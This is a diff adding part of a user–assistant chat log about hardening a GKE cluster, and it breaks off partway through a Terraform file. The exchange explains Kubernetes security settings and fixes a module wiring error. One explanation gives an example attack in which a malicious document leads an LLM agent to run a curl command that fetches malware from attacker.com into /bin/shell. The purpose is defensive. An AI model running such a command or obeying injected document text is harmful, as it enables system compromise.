@@ -8337,3 +8337,1920 @@ spec:
 Do you fully understand these configurations and the purpose of the Vector Database, or do we need to clarify anything before moving forward?
 =============================
 
+well, I do not understand the following parts, explain them more in detail and from the base if needed:
+
+YAML
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+        runAsGroup: 10001
+        fsGroup: 10001
+        seccompProfile:
+          type: RuntimeDefault
+runAsNonRoot: true: Rejects execution if the container attempts to run as user 0 (root).
+
+runAsUser / runAsGroup: 10001: Forces the container processes to run under an unprivileged UID/GID (10001).
+
+fsGroup: 10001: Grants UID 10001 ownership of any mounted volumes.
+
+seccompProfile.type: RuntimeDefault: Restricts the available Linux system calls to the default container runtime profile.
+================
+Container Security Context & Resource Limits
+YAML
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities:
+              drop:
+                - ALL
+allowPrivilegeEscalation: false: Prevents child processes from gaining more privileges than their parent process (e.g., blocking setuid binaries).
+
+readOnlyRootFilesystem: true: OWASP LLM05 Control. Locks the container filesystem completely. If an injected prompt tries to write malware or download binaries to disk, the OS rejects the write operation.
+
+capabilities.drop: ["ALL"]: Strips all Linux kernel capabilities (e.g., CAP_NET_ADMIN, CAP_SYS_ADMIN, CAP_RAW_IO).
+
+==================
+### Linux Fundamentals: How Linux Handles Users, Processes, and the Kernel
+
+To understand these YAML fields, we first need to look at how Linux manages security under the hood:
+
+1. **User IDs (UID) & Group IDs (GID):** Linux does not care about usernames like `ubuntu` or `root`. It only understands numbers. UID `0` is `root` (the superuser with full control over the machine). Any number above `0` (e.g., `10001`) is an unprivileged user.
+2. **System Calls (Syscalls):** User programs (like Python or Nginx) cannot touch physical hardware or memory directly. Whenever a program wants to read a file, create a network connection, or spawn a process, it must ask the Linux Kernel via a **system call** (syscall).
+3. **Container Reality:** A container is not a virtual machine. It is just a standard Linux process running directly on the host machine's kernel, isolated using Linux `namespaces` and `cgroups`. If a container process runs as UID `0`, it is running as UID `0` on the host Linux kernel unless restricted.
+
+---
+
+### Part 1: Pod-Level Identity & Storage Controls
+
+These settings define **who** is running the container and **how** files on disk are owned.
+
+```yaml
+securityContext:
+  runAsNonRoot: true
+  runAsUser: 10001
+  runAsGroup: 10001
+  fsGroup: 10001
+  seccompProfile:
+    type: RuntimeDefault
+
+```
+
+#### 1. `runAsNonRoot: true`
+
+* **What it does:** Acts as a pre-flight guardrail before starting the container.
+* **How it works:** When Kubernetes attempts to start a container, it checks the image manifest and configuration. If the container is configured to run as UID `0` (`root`), Kubernetes refuses to start the pod and throws a `CreateContainerConfigError`.
+* **Why we use it:** Prevents developers from accidentally deploying container images that default to running as root.
+
+#### 2. `runAsUser: 10001` & `runAsGroup: 10001`
+
+* **What it does:** Explicitly sets the process execution identity to an unprivileged user ID (`10001`) and group ID (`10001`).
+* **How it works:** When the container process starts, the Linux kernel assigns UID `10001` to the process table entry.
+* **Why we use it:** If an attacker finds a remote code execution (RCE) vulnerability inside the Python application, they only gain the privileges of UID `10001`. They cannot modify system files, install system packages, or manipulate host devices.
+
+#### 3. `fsGroup: 10001` (File System Group)
+
+* **What it does:** Manages volume permission ownership.
+* **How it works:** When Kubernetes mounts a volume (like an `emptyDir` or persistent disk) into a pod, that volume's filesystem might default to being owned by root (UID/GID `0`). Setting `fsGroup: 10001` tells Kubernetes: *"Automatically set the group ownership (`chown`) of all files in the mounted volume to GID 10001 when the pod starts."*
+* **Why we use it:** Because our process runs as unprivileged user `10001`, it would be blocked with a `Permission Denied` error when trying to write to a volume owned by root. `fsGroup` ensures the container can read and write to its mounted storage safely.
+
+#### 4. `seccompProfile.type: RuntimeDefault`
+
+* **What it does:** Restricts which system calls the container can make to the host Linux kernel.
+* **How it works:** **Seccomp** stands for *Secure Computing Mode*, a feature built directly into the Linux kernel. The Linux kernel has over 300 system calls (e.g., `read`, `write`, `reboot`, `kexec_load`, `ptrace`). `RuntimeDefault` enables containerd's default filter profile, which blocks ~40 dangerous system calls (like rebooting the host or altering kernel modules).
+* **Why we use it:** If an attacker exploits a 0-day vulnerability in Linux, Seccomp stops the application from executing dangerous low-level kernel calls, neutralizing the exploit before it hits the host OS.
+
+---
+
+### Part 2: Container-Level Lockdown & Isolation Controls
+
+These settings define **what the process is allowed to do** once it is running.
+
+```yaml
+securityContext:
+  allowPrivilegeEscalation: false
+  readOnlyRootFilesystem: true
+  capabilities:
+    drop:
+      - ALL
+
+```
+
+#### 1. `allowPrivilegeEscalation: false`
+
+* **What it does:** Blocks processes from gaining more privileges than they started with.
+* **How it works:** Sets the `no_new_privs` bit on the process in the Linux kernel. In Linux, certain executable binaries have special permissions set (called `SUID` bits, like the `/usr/bin/passwd` binary) that allow a normal user to temporarily run a process as root. Setting this to `false` instructs the kernel to ignore all `SUID` flags.
+* **Why we use it:** Even if an attacker finds an executable inside the container designed to escalate privileges to root, the Linux kernel refuses to grant those rights.
+
+#### 2. `readOnlyRootFilesystem: true`
+
+* **What it does:** Locks the entire container disk image as read-only.
+* **How it works:** The container runtime mounts the root directory (`/`) using the read-only flag (`ro`).
+* **Why we use it (OWASP LLM05 Control):** In an **Indirect Prompt Injection** attack, a malicious document might trick the LLM agent into executing a bash payload like `curl [http://attacker.com/malware](http://attacker.com/malware) -o /bin/shell && chmod +x /bin/shell`. With a read-only filesystem, the OS instantly aborts the write with `Read-only file system`, rendering malware injection completely impossible. (Writable paths like `/tmp` must be explicitly mounted via dedicated `emptyDir` volumes).
+
+#### 3. `capabilities.drop: ["ALL"]`
+
+* **What it does:** Strips all Linux root capabilities from the container process.
+* **How it works:** Historically, Linux divided "root power" into ~40 granular toggles called **Capabilities**. For example:
+* `CAP_NET_ADMIN`: Ability to modify network interfaces and `iptables` rules.
+* `CAP_SYS_TIME`: Ability to alter the system clock.
+* `CAP_CHOWN`: Ability to change file ownership.
+By default, Docker/Kubernetes grants containers ~14 default capabilities. `capabilities.drop: ["ALL"]` strips away every single one of those 40 capabilities.
+
+
+* **Why we use it:** Ensures the process operates in a complete zero-trust sandbox. Even if UID `10001` somehow bypassed other controls, it lacks the kernel capability flags required to manipulate network stacks, mount devices, or inspect other host processes.
+
+---
+
+### Summary Architectural Map
+
+| Security Parameter | Defense Boundary | What It Prevents |
+| --- | --- | --- |
+| `runAsNonRoot` / `runAsUser` | Identity Layer | Prevents container processes from running with root privileges on the node. |
+| `fsGroup` | Storage Layer | Solves `Permission Denied` errors on volumes while maintaining non-root access. |
+| `seccompProfile` | Kernel Layer | Blocks dangerous system calls (e.g., host reboot, kernel module loading). |
+| `allowPrivilegeEscalation` | Process Layer | Prevents `SUID` binaries from escalating process permissions to root. |
+| `readOnlyRootFilesystem` | Filesystem Layer | Blocks attackers from writing binaries, scripts, or malware to disk. |
+| `capabilities.drop: ["ALL"]` | System Kernel Layer | Removes all administrative kernel capabilities from the container. |
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+
+========
+
+yes, that's ok for now, lets proceed. I got the following error: @Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ cd /workspaces/gke-defense-in-depth/environments/prod
+terraform apply -auto-approve
+module.kms_cmek.google_project_service.container_api: Refreshing state... [id=kam-dev-test/container.googleapis.com]
+module.kms_cmek.google_kms_key_ring.keyring: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring]
+data.google_client_config.default: Reading...
+module.vpc_network.google_compute_network.vpc: Refreshing state... [id=projects/kam-dev-test/global/networks/gke-did-vpc]
+module.kms_cmek.data.google_project.project: Reading...
+module.kms_cmek.google_project_service.compute_api: Refreshing state... [id=kam-dev-test/compute.googleapis.com]
+data.google_client_config.default: Read complete after 0s [id=projects/"kam-dev-test"/regions/"us-central1"/zones/<null>]
+module.kms_cmek.google_kms_crypto_key.gke_disk_key: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-disk-encryption-key]
+module.kms_cmek.google_kms_crypto_key.gke_etcd_key: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-etcd-encryption-key]
+module.vpc_network.google_compute_router.router: Refreshing state... [id=projects/kam-dev-test/regions/us-central1/routers/gke-did-vpc-router]
+module.vpc_network.google_compute_subnetwork.subnet: Refreshing state... [id=projects/kam-dev-test/regions/us-central1/subnetworks/gke-did-subnet-us-central1]
+module.kms_cmek.data.google_project.project: Read complete after 0s [id=projects/kam-dev-test]
+module.vpc_network.google_compute_router_nat.nat: Refreshing state... [id=kam-dev-test/us-central1/gke-did-vpc-router/gke-did-vpc-nat]
+module.kms_cmek.google_kms_crypto_key_iam_member.gke_etcd_encrypter_decrypter: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-etcd-encryption-key/roles/cloudkms.cryptoKeyEncrypterDecrypter/serviceAccount:service-243781974020@container-engine-robot.iam.gserviceaccount.com]
+module.kms_cmek.google_kms_crypto_key_iam_member.gke_disk_encrypter_decrypter: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-disk-encryption-key/roles/cloudkms.cryptoKeyEncrypterDecrypter/serviceAccount:service-243781974020@compute-system.iam.gserviceaccount.com]
+module.gke_cluster.google_service_account.gke_nodes_sa: Refreshing state... [id=projects/kam-dev-test/serviceAccounts/prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com]
+module.gke_cluster.google_container_cluster.primary: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/clusters/prod-gke-did-cluster]
+module.gke_cluster.google_kms_crypto_key_iam_member.node_disk_decrypter: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-disk-encryption-key/roles/cloudkms.cryptoKeyEncrypterDecrypter/serviceAccount:prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com]
+module.gke_cluster.google_project_iam_member.node_monitoring: Refreshing state... [id=kam-dev-test/roles/monitoring.metricWriter/serviceAccount:prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com]
+module.gke_cluster.google_project_iam_member.node_logging: Refreshing state... [id=kam-dev-test/roles/logging.logWriter/serviceAccount:prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com]
+module.gke_cluster.google_project_iam_member.node_artifact_registry: Refreshing state... [id=kam-dev-test/roles/artifactregistry.reader/serviceAccount:prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com]
+module.gke_cluster.google_container_node_pool.system_nodes: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/clusters/prod-gke-did-cluster/nodePools/system-node-pool]
+module.gke_cluster.google_container_node_pool.gvisor_nodes: Refreshing state... [id=projects/kam-dev-test/locations/us-central1/clusters/prod-gke-did-cluster/nodePools/gvisor-sandbox-pool]
+module.secops_logging.google_project_service.monitoring_api: Refreshing state... [id=kam-dev-test/monitoring.googleapis.com]
+module.secops_logging.google_project_service.logging_api: Refreshing state... [id=kam-dev-test/logging.googleapis.com]
+module.cloud_service_mesh.google_project_service.gkehub_api: Refreshing state... [id=kam-dev-test/gkehub.googleapis.com]
+module.binary_auth.google_project_service.binauthz_api: Refreshing state... [id=kam-dev-test/binaryauthorization.googleapis.com]
+module.mlops_inference.google_service_account.mlops_sa: Refreshing state... [id=projects/kam-dev-test/serviceAccounts/mlops-inference-sa@kam-dev-test.iam.gserviceaccount.com]
+module.cloud_service_mesh.google_project_service.mesh_api: Refreshing state... [id=kam-dev-test/mesh.googleapis.com]
+module.binary_auth.google_project_service.containeranalysis_api: Refreshing state... [id=kam-dev-test/containeranalysis.googleapis.com]
+module.mlops_inference.kubernetes_namespace.mlops: Refreshing state... [id=mlops-inference]
+module.mlops_inference.kubernetes_service_v1.mlops_service: Refreshing state... [id=mlops-inference/mlops-model-server-svc]
+module.mlops_inference.kubernetes_service_account.mlops_ksa: Refreshing state... [id=mlops-inference/mlops-inference-ksa]
+module.mlops_inference.google_service_account_iam_member.workload_identity_user: Refreshing state... [id=projects/kam-dev-test/serviceAccounts/mlops-inference-sa@kam-dev-test.iam.gserviceaccount.com/roles/iam.workloadIdentityUser/serviceAccount:kam-dev-test.svc.id.goog[mlops-inference/mlops-inference-ksa]]
+module.mlops_inference.kubernetes_deployment_v1.mlops_inference: Refreshing state... [id=mlops-inference/mlops-model-server]
+module.binary_auth.google_container_analysis_note.attestor_note: Refreshing state... [id=projects/kam-dev-test/notes/prod-build-attestor-note]
+module.cloud_service_mesh.google_gke_hub_membership.membership: Refreshing state... [id=projects/kam-dev-test/locations/global/memberships/prod-gke-did-cluster-fleet-member]
+module.cloud_service_mesh.google_gke_hub_feature.servicemesh: Refreshing state... [id=projects/kam-dev-test/locations/global/features/servicemesh]
+module.secops_logging.google_storage_bucket.secops_log_bucket: Refreshing state... [id=kam-dev-test-gke-secops-audit-logs]
+module.secops_logging.google_logging_project_sink.gke_security_sink: Refreshing state... [id=projects/kam-dev-test/sinks/prod-gke-did-cluster-secops-audit-sink]
+module.secops_logging.google_storage_bucket_iam_member.sink_writer: Refreshing state... [id=b/kam-dev-test-gke-secops-audit-logs/roles/storage.objectCreator/serviceAccount:service-243781974020@gcp-sa-logging.iam.gserviceaccount.com]
+module.binary_auth.google_binary_authorization_attestor.attestor: Refreshing state... [id=projects/kam-dev-test/attestors/prod-build-attestor]
+module.binary_auth.google_binary_authorization_policy.policy: Refreshing state... [id=projects/kam-dev-test]
+module.cloud_service_mesh.google_gke_hub_feature_membership.servicemesh_membership: Refreshing state... [id=projects/kam-dev-test/locations/global/features/servicemesh/membershipId/prod-gke-did-cluster-fleet-member]
+module.policy_gatekeeper.google_project_service.policycontroller_api: Refreshing state... [id=kam-dev-test/anthospolicycontroller.googleapis.com]
+module.policy_gatekeeper.google_gke_hub_feature.policycontroller: Refreshing state... [id=projects/kam-dev-test/locations/global/features/policycontroller]
+module.policy_gatekeeper.google_gke_hub_feature_membership.policycontroller_membership: Refreshing state... [id=projects/kam-dev-test/locations/global/features/policycontroller/membershipId/prod-gke-did-cluster-fleet-member]
+
+Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols:
+  ~ update in-place
+
+Terraform will perform the following actions:
+
+  # module.policy_gatekeeper.google_gke_hub_feature_membership.policycontroller_membership will be updated in-place
+  ~ resource "google_gke_hub_feature_membership" "policycontroller_membership" {
+        id                  = "projects/kam-dev-test/locations/global/features/policycontroller/membershipId/prod-gke-did-cluster-fleet-member"
+        # (5 unchanged attributes hidden)
+
+      ~ policycontroller {
+            # (1 unchanged attribute hidden)
+
+          ~ policy_controller_hub_config {
+              - audit_interval_seconds     = 60 -> null
+                # (6 unchanged attributes hidden)
+
+                # (3 unchanged blocks hidden)
+            }
+        }
+    }
+
+Plan: 0 to add, 1 to change, 0 to destroy.
+module.policy_gatekeeper.google_gke_hub_feature_membership.policycontroller_membership: Modifying... [id=projects/kam-dev-test/locations/global/features/policycontroller/membershipId/prod-gke-did-cluster-fleet-member]
+module.policy_gatekeeper.google_gke_hub_feature_membership.policycontroller_membership: Modifications complete after 6s [id=projects/kam-dev-test/locations/global/features/policycontroller/membershipId/prod-gke-did-cluster-fleet-member]
+
+Apply complete! Resources: 0 added, 1 changed, 0 destroyed.
+
+Outputs:
+
+binauthz_attestor_name = "prod-build-attestor"
+cluster_endpoint = "35.232.167.233"
+cluster_name = "prod-gke-did-cluster"
+gke_disk_key_id = "projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-disk-encryption-key"
+gke_etcd_key_id = "projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-etcd-encryption-key"
+mlops_namespace = "mlops-inference"
+network_id = "projects/kam-dev-test/global/networks/gke-did-vpc"
+node_service_account = "prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com"
+pod_ip_range_name = "gke-pods"
+subnet_id = "projects/kam-dev-test/regions/us-central1/subnetworks/gke-did-subnet-us-central1"
+svc_ip_range_name = "gke-services"
+@Kam4280 ➜ /workspaces/gke-defense-in-depth/environments/prod (main) $ kubectl apply -f ../../modules/09-llm-rag-agent-security/rag-agent.yaml
+kubectl apply -f ../../modules/09-llm-rag-agent-security/vector-db.yaml
+
+# 3. Verify Pod statuses in mlops-secops namespace
+kubectl get pods -n mlops-secops -o wide
+Error from server (NotFound): error when creating "../../modules/09-llm-rag-agent-security/rag-agent.yaml": namespaces "mlops-secops" not found
+Error from server (NotFound): error when creating "../../modules/09-llm-rag-agent-security/rag-agent.yaml": namespaces "mlops-secops" not found
+Error from server (NotFound): error when creating "../../modules/09-llm-rag-agent-security/vector-db.yaml": namespaces "mlops-secops" not found
+Error from server (NotFound): error when creating "../../modules/09-llm-rag-agent-security/vector-db.yaml": namespaces "mlops-secops" not found
+No resources found in mlops-secops namespace.
+========================
+### Layer Isolation: Environment Orchestration Layer (`environments/prod`)
+
+---
+
+### Cause of the Error
+
+The error `Error from server (NotFound): namespaces "mlops-secops" not found` occurred because Terraform did not instantiate our new module (`modules/09-llm-rag-agent-security`).
+
+Although we created the module files inside `modules/09-llm-rag-agent-security/`, our root environment configuration (`environments/prod/main.tf`) was never updated to invoke `module "llm_rag_security"`. As a result, `terraform apply` skipped provisioning the `mlops-secops` namespace and Workload Identity resources.
+
+---
+
+### Step 1: Instantiate Module 09 in `environments/prod/main.tf`
+
+Update `/workspaces/gke-defense-in-depth/environments/prod/main.tf` with the complete, full-file content below to include `module "llm_rag_security"`:
+
+```hcl
+# ------------------------------------------------------------------------------
+# Production Infrastructure Orchestration
+# Environment: Prod
+# ------------------------------------------------------------------------------
+
+terraform {
+  required_version = ">= 1.5.0"
+  required_providers {
+    google = {
+      source  = "hashicorp/google"
+      version = "~> 5.0"
+    }
+    kubernetes = {
+      source  = "hashicorp/kubernetes"
+      version = "~> 2.23"
+    }
+  }
+}
+
+provider "google" {
+  project = var.project_id
+  region  = var.region
+}
+
+# 1. Fetch GKE Cluster Credentials for Kubernetes Provider
+data "google_client_config" "default" {}
+
+data "google_container_cluster" "primary" {
+  name       = module.gke_cluster.cluster_name
+  location   = var.region
+  depends_on = [module.gke_cluster]
+}
+
+provider "kubernetes" {
+  host                   = "https://${data.google_container_cluster.primary.endpoint}"
+  token                  = data.google_client_config.default.access_token
+  cluster_ca_certificate = base64decode(data.google_container_cluster.primary.master_auth[0].cluster_ca_certificate)
+}
+
+# ------------------------------------------------------------------------------
+# Infrastructure Modules (Tier 1 - Tier 8)
+# ------------------------------------------------------------------------------
+
+# Module 01: Private VPC Network
+module "vpc_network" {
+  source     = "../../modules/01-vpc-network"
+  project_id = var.project_id
+  region     = var.region
+}
+
+# Module 02: KMS Customer-Managed Encryption Keys
+module "kms_cmek" {
+  source     = "../../modules/02-kms-cmek"
+  project_id = var.project_id
+  region     = var.region
+}
+
+# Module 03: Hardened Private GKE Cluster
+module "gke_cluster" {
+  source          = "../../modules/03-gke-cluster"
+  project_id      = var.project_id
+  region          = var.region
+  vpc_id          = module.vpc_network.network_id
+  subnet_id       = module.vpc_network.subnet_id
+  gke_disk_key_id = module.kms_cmek.gke_disk_key_id
+  gke_etcd_key_id = module.kms_cmek.gke_etcd_key_id
+}
+
+# Module 04: Binary Authorization
+module "binary_auth" {
+  source     = "../../modules/04-binary-auth"
+  project_id = var.project_id
+}
+
+# Module 05: Cloud Service Mesh
+module "cloud_service_mesh" {
+  source       = "../../modules/05-cloud-service-mesh"
+  project_id   = var.project_id
+  cluster_name = module.gke_cluster.cluster_name
+  location     = var.region
+}
+
+# Module 06: Policy Controller / Gatekeeper
+module "policy_gatekeeper" {
+  source       = "../../modules/06-policy-gatekeeper"
+  project_id   = var.project_id
+  cluster_name = module.gke_cluster.cluster_name
+  location     = var.region
+}
+
+# Module 07: SecOps Audit Logging
+module "secops_logging" {
+  source     = "../../modules/07-secops-logging"
+  project_id = var.project_id
+}
+
+# Module 08: MLOps gVisor Runtime Sandbox
+module "mlops_inference" {
+  source     = "../../modules/08-mlops-gvisor"
+  project_id = var.project_id
+}
+
+# Module 09: Phase 2 LLM Agent & RAG Security Sandbox
+module "llm_rag_security" {
+  source     = "../../modules/09-llm-rag-agent-security"
+  project_id = var.project_id
+}
+
+```
+
+---
+
+### Step 2: Step Validation Harness
+
+Now initialize the new module reference and apply the Terraform changes to create the `mlops-secops` namespace and Workload Identity resources in the live cluster:
+
+```bash
+cd /workspaces/gke-defense-in-depth/environments/prod
+
+# 1. Initialize Terraform to index the newly referenced module
+terraform init
+
+# 2. Apply Terraform changes to create namespace and identity resources
+terraform apply -auto-approve
+
+# 3. Apply the Kubernetes workload manifests
+kubectl apply -f ../../modules/09-llm-rag-agent-security/rag-agent.yaml
+kubectl apply -f ../../modules/09-llm-rag-agent-security/vector-db.yaml
+
+# 4. Verify pod statuses in the mlops-secops namespace
+kubectl get pods -n mlops-secops -o wide
+
+```
+
+---
+
+### Step 3: GitOps Pipeline Synchronization
+
+Commit and push the environment update to your repository:
+
+```bash
+cd /workspaces/gke-defense-in-depth
+git add environments/prod/main.tf
+git commit -m "feat(prod): instantiate module 09-llm-rag-agent-security in prod main.tf"
+git push origin main
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+===========================
+in step 1, here is the current content of environments/prod/main.tf without the module 9. the provided file for this module to include  "llm_rag_security"  in step 1 doesn't look to follow the same pattern in this file. : terraform {
+  required_version = ">= 1.5.0"
+  required_providers {
+    google = {
+      source  = "hashicorp/google"
+      version = "~> 5.0"
+    }
+    google-beta = {
+      source  = "hashicorp/google-beta"
+      version = "~> 5.0"
+    }
+  }
+}
+
+provider "google" {
+  project = var.project_id
+  region  = var.region
+}
+
+provider "google-beta" {
+  project = var.project_id
+  region  = var.region
+}
+data "google_client_config" "default" {}
+
+provider "kubernetes" {
+  host                   = "https://${module.gke_cluster.cluster_endpoint}"
+  token                  = data.google_client_config.default.access_token
+  cluster_ca_certificate = base64decode(module.gke_cluster.ca_certificate) # <--- Matches your ca_certificate output
+}
+
+# ------------------------------------------------------------------------------
+# Module 01: Tier 1 VPC Network Foundation
+# ------------------------------------------------------------------------------
+module "vpc_network" {
+  source     = "../../modules/01-vpc-network"
+  project_id = var.project_id
+  region     = var.region
+}
+
+# ------------------------------------------------------------------------------
+# Module 02: Tier 1 KMS CMEK Keyrings & Keys
+# ------------------------------------------------------------------------------
+module "kms_cmek" {
+  source     = "../../modules/02-kms-cmek"
+  project_id = var.project_id
+  region     = var.region
+}
+
+# ------------------------------------------------------------------------------
+# Module 03: Tier 2 Hardened Private GKE Cluster
+# ------------------------------------------------------------------------------
+module "gke_cluster" {
+  source                 = "../../modules/03-gke-cluster"
+  project_id             = var.project_id
+  region                 = var.region
+  cluster_name           = var.cluster_name
+  network_id             = module.vpc_network.network_id
+  subnet_id              = module.vpc_network.subnet_id
+  pod_ip_range_name      = module.vpc_network.pod_ip_range_name
+  svc_ip_range_name      = module.vpc_network.svc_ip_range_name
+  gke_etcd_key_id        = module.kms_cmek.gke_etcd_key_id
+  gke_disk_key_id        = module.kms_cmek.gke_disk_key_id
+  master_ipv4_cidr_block = "172.16.0.0/28"
+
+  depends_on = [
+    module.vpc_network,
+    module.kms_cmek
+  ]
+}
+# ------------------------------------------------------------------------------
+# 3. Tier 2 Binary Authorization Module Call (Supply Chain Security)
+# ------------------------------------------------------------------------------
+module "binary_auth" {
+  source     = "../../modules/04-binary-auth"
+  project_id = var.project_id
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+# Output Binary Authorization Attestor Name
+output "binauthz_attestor_name" {
+  value       = module.binary_auth.attestor_name
+  description = "The Binary Authorization attestor name."
+}
+# ------------------------------------------------------------------------------
+# Module 05: Tier 3 Cloud Service Mesh & Fleet Registration
+# ------------------------------------------------------------------------------
+module "cloud_service_mesh" {
+  source       = "../../modules/05-cloud-service-mesh"
+  project_id   = var.project_id
+  location     = var.region
+  cluster_name = var.cluster_name
+  cluster_id   = module.gke_cluster.cluster_id
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+# ------------------------------------------------------------------------------
+# Module 06: Tier 4 Governance & OPA Gatekeeper (Policy Controller)
+# ------------------------------------------------------------------------------
+module "policy_gatekeeper" {
+  source        = "../../modules/06-policy-gatekeeper"
+  project_id    = var.project_id
+  membership_id = module.cloud_service_mesh.membership_id
+
+  depends_on = [
+    module.cloud_service_mesh
+  ]
+}
+# ------------------------------------------------------------------------------
+# Module 07: Tier 5 SecOps Audit Logging & Log Sinks
+# ------------------------------------------------------------------------------
+module "secops_logging" {
+  source       = "../../modules/07-secops-logging"
+  project_id   = var.project_id
+  region       = var.region
+  cluster_name = var.cluster_name
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+# ------------------------------------------------------------------------------
+# Module 08: Tier 6 Sandboxed MLOps Workload Deployment
+# ------------------------------------------------------------------------------
+module "mlops_inference" {
+  source       = "../../modules/08-mlops-inference"
+  project_id   = var.project_id
+  cluster_name = var.cluster_name
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+output "mlops_namespace" {
+  value       = module.mlops_inference.namespace
+  description = "The namespace of the deployed sandboxed MLOps workload."
+}
+=============================
+### Layer Isolation: Environment Orchestration Layer (`environments/prod`)
+
+Spot on catch. Maintaining exact structural consistency with your existing `main.tf`—including the `google-beta` provider configuration, explicit cluster output references (`module.gke_cluster.cluster_endpoint`), outputs, and `depends_on` dependency arrays—is essential to prevent Terraform state drift.
+
+---
+
+### Step 1: Updated Complete `environments/prod/main.tf`
+
+Here is the exact, complete `environments/prod/main.tf` file updated to include **Module 09** while adhering strictly to your existing file pattern:
+
+```hcl
+terraform {
+  required_version = ">= 1.5.0"
+  required_providers {
+    google = {
+      source  = "hashicorp/google"
+      version = "~> 5.0"
+    }
+    google-beta = {
+      source  = "hashicorp/google-beta"
+      version = "~> 5.0"
+    }
+  }
+}
+
+provider "google" {
+  project = var.project_id
+  region  = var.region
+}
+
+provider "google-beta" {
+  project = var.project_id
+  region  = var.region
+}
+
+data "google_client_config" "default" {}
+
+provider "kubernetes" {
+  host                   = "https://${module.gke_cluster.cluster_endpoint}"
+  token                  = data.google_client_config.default.access_token
+  cluster_ca_certificate = base64decode(module.gke_cluster.ca_certificate) # <--- Matches your ca_certificate output
+}
+
+# ------------------------------------------------------------------------------
+# Module 01: Tier 1 VPC Network Foundation
+# ------------------------------------------------------------------------------
+module "vpc_network" {
+  source     = "../../modules/01-vpc-network"
+  project_id = var.project_id
+  region     = var.region
+}
+
+# ------------------------------------------------------------------------------
+# Module 02: Tier 1 KMS CMEK Keyrings & Keys
+# ------------------------------------------------------------------------------
+module "kms_cmek" {
+  source     = "../../modules/02-kms-cmek"
+  project_id = var.project_id
+  region     = var.region
+}
+
+# ------------------------------------------------------------------------------
+# Module 03: Tier 2 Hardened Private GKE Cluster
+# ------------------------------------------------------------------------------
+module "gke_cluster" {
+  source                 = "../../modules/03-gke-cluster"
+  project_id             = var.project_id
+  region                 = var.region
+  cluster_name           = var.cluster_name
+  network_id             = module.vpc_network.network_id
+  subnet_id              = module.vpc_network.subnet_id
+  pod_ip_range_name      = module.vpc_network.pod_ip_range_name
+  svc_ip_range_name      = module.vpc_network.svc_ip_range_name
+  gke_etcd_key_id        = module.kms_cmek.gke_etcd_key_id
+  gke_disk_key_id        = module.kms_cmek.gke_disk_key_id
+  master_ipv4_cidr_block = "172.16.0.0/28"
+
+  depends_on = [
+    module.vpc_network,
+    module.kms_cmek
+  ]
+}
+
+# ------------------------------------------------------------------------------
+# 3. Tier 2 Binary Authorization Module Call (Supply Chain Security)
+# ------------------------------------------------------------------------------
+module "binary_auth" {
+  source     = "../../modules/04-binary-auth"
+  project_id = var.project_id
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+# Output Binary Authorization Attestor Name
+output "binauthz_attestor_name" {
+  value       = module.binary_auth.attestor_name
+  description = "The Binary Authorization attestor name."
+}
+
+# ------------------------------------------------------------------------------
+# Module 05: Tier 3 Cloud Service Mesh & Fleet Registration
+# ------------------------------------------------------------------------------
+module "cloud_service_mesh" {
+  source       = "../../modules/05-cloud-service-mesh"
+  project_id   = var.project_id
+  location     = var.region
+  cluster_name = var.cluster_name
+  cluster_id   = module.gke_cluster.cluster_id
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+# ------------------------------------------------------------------------------
+# Module 06: Tier 4 Governance & OPA Gatekeeper (Policy Controller)
+# ------------------------------------------------------------------------------
+module "policy_gatekeeper" {
+  source        = "../../modules/06-policy-gatekeeper"
+  project_id    = var.project_id
+  membership_id = module.cloud_service_mesh.membership_id
+
+  depends_on = [
+    module.cloud_service_mesh
+  ]
+}
+
+# ------------------------------------------------------------------------------
+# Module 07: Tier 5 SecOps Audit Logging & Log Sinks
+# ------------------------------------------------------------------------------
+module "secops_logging" {
+  source       = "../../modules/07-secops-logging"
+  project_id   = var.project_id
+  region       = var.region
+  cluster_name = var.cluster_name
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+# ------------------------------------------------------------------------------
+# Module 08: Tier 6 Sandboxed MLOps Workload Deployment
+# ------------------------------------------------------------------------------
+module "mlops_inference" {
+  source       = "../../modules/08-mlops-inference"
+  project_id   = var.project_id
+  cluster_name = var.cluster_name
+
+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+output "mlops_namespace" {
+  value       = module.mlops_inference.namespace
+  description = "The namespace of the deployed sandboxed MLOps workload."
+}
+
+# ------------------------------------------------------------------------------
+# Module 09: Phase 2 LLM Agent & RAG Security Sandbox
+# ------------------------------------------------------------------------------
+module "llm_rag_security" {
+  source     = "../../modules/09-llm-rag-agent-security"
+  project_id = var.project_id
+
